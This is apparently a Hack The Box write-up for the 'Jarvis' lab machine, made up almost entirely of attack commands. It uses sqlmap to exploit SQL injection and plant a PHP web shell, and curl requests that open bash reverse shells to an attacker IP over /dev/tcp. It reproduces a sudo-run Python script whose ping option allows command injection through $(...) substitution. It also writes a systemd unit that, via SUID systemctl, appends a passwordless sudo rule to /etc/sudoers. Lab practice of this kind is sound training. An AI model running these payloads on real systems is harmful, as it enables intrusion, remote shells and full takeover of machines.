Jarvis is a medium difficulty Linux box running a web server, which has DoS and brute force protection enabled. A page is found to be vulnerable to SQL injection, which requires manual exploitation. This service allows the writing of a shell to the web root for the foothold. The www user is allowed to execute a script as another user, and the script is vulnerable to command injection. On further enumeration, systemctl is found to have the SUID bit set, which is leveraged to gain a root shell.


sqlmap -u "http://10.129.229.137/room.php?cod=1" --dbms=mysql -p cod --technique=T --time-sec=10 --level=5 --risk=3 --random-agent --delay=1 --safe-url=http://10.129.229.137/ --safe-freq=10 --sql-query="SELECT @@global.document_root"


#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()
	
    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1
	
    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
	
def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req
			
def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]
	
def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req
	
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()


 sqlmap -u http://10.129.19.171/room.php?cod=6 -p cod --delay=2 --dbms=mysql --os-shell --web-root=/var/www/html --random-agent --skip-waf --batch --technique=T

 sqlmap -u http://10.129.19.171/room.php?cod=6 -p cod --delay=2 --dbms=mysql --file-write=shell.php --file-dest=/var/www/html/lndex.php --random-agent --skip-waf --batch --technique=T

  curl -X POST http://10.129.19.171/lndex.php --data-urlencode exec=ls

curl -X POST http://10.129.19.171/lndex.php --data-urlencode 'exec=bash -c "bash -i >& /dev/tcp/10.10.14.27/16106 0>&1"'

echo 'bash -c "bash -i >& /dev/tcp/10.10.14.27/16107 0>&1"' >/tmp/lndex.sh

chmod a+x /tmp/lndex.sh

sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

echo 'bash -c "bash -i >& /dev/tcp/10.10.14.26/16107 0>&1"' > /tmp/lndex.sh
chmod a+x /tmp/lndex.sh
$(/tmp/lndex.sh)


find / -perm -4000 -user root -group pepper 2>/dev/null
/bin/systemctl


cd /home/pepper
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "echo pepper ALL=\(ALL\) NOPASSWD: ALL >> /etc/sudoers"
[Install]
WantedBy=multi-user.target' > escalate.service

systemctl link /home/pepper/escalate.service

systemctl start escalate.service


